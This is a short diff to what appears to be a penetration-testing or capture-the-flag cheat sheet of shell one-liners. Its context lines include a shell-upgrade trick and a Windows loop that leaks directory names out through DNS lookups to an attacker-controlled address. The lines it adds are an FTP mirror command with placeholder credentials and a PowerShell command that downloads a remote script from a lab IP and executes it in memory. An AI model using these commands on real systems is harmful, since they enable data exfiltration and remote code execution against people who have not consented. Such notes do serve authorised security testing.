@@ -16,7 +16,13 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 -> export TERM=xterm-256color
 -> exec /bin/bash
 
+#Download all files from ftp server
+wget -m --no-passive ftp://username:password@<FTP IP>
+
 #Windows
 
 #Basic DNS Tunneling
 for /F %i in ('dir /B C:\') do nslookup %i.com <your_ip>
+
+#File downloads
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/unicorn.html')"
